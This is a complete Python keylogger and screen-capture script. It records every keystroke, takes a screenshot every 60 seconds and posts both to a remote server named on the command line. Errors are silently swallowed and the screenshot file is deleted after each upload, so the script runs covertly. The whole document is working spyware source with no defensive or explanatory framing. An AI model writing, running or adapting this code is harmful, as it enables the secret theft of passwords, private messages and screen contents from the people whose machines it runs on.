
import pynput.keyboard
import threading
import requests
import time
import pyautogui
import os
import sys

# === DEFAULT CONFIGURATION ===
DEFAULT_HOST = "localhost"
DEFAULT_PORT = 5000
screenshot_interval = 60  # seconds
# ==============================

# Handle command line arguments
try:
    SERVER_HOST = sys.argv[1]
    SERVER_PORT = int(sys.argv[2])
except IndexError:
    SERVER_HOST = DEFAULT_HOST
    SERVER_PORT = DEFAULT_PORT

SERVER_URL = f"http://{SERVER_HOST}:{SERVER_PORT}"
log = ""

def send_keylog():
    global log
    if log:
        try:
            requests.post(f"{SERVER_URL}/upload_keys", data={"keys": log})
            log = ""
        except:
            pass
    timer = threading.Timer(30, send_keylog)
    timer.start()

def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        log += f" [{key}] "

def capture_screenshot():
    while True:
        try:
            screenshot = pyautogui.screenshot()
            filename = "screen.png"
            screenshot.save(filename)
            with open(filename, 'rb') as img:
                requests.post(f"{SERVER_URL}/upload_screenshot", files={"screenshot": img})
            os.remove(filename)
        except:
            pass
        time.sleep(screenshot_interval)

keyboard_listener = pynput.keyboard.Listener(on_press=on_press)
keyboard_listener.start()

send_keylog()
threading.Thread(target=capture_screenshot).start()
keyboard_listener.join()
